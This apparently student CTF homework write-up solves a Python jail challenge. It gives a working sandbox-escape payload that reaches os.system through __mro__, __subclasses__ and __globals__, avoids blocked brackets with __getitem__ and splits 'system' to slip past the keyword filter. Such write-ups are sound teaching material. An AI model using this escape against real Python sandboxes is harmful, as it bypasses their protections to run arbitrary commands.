# Homework 2-2 Escape the jail of UwU [100 points] (17 solves)
By viewing the source code, keywords include `[`, `]`, `builtins`, `import`, `system`, `os` are blocked. Also, `__builtins__` is removed. Therefore, we need to use other way to use system command and bypass the keyword restriction.
First, `__getitem__(1)` to replace the `[]`,

from `"".__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(-4).__init__.__globals__.__getitem__('s' + 'ys' + 'tem')('ls')`, we see a `flag.txt` file. Then, we change a bit to `"".__class__.__mro__.__getitem__(1).__subclasses__().__getitem__(-4).__init__.__globals__.__getitem__('s' + 'ys' + 'tem')('cat flag.txt')` to view the flag file.

## Reference:
- https://ctftime.org/writeup/25816
- https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes
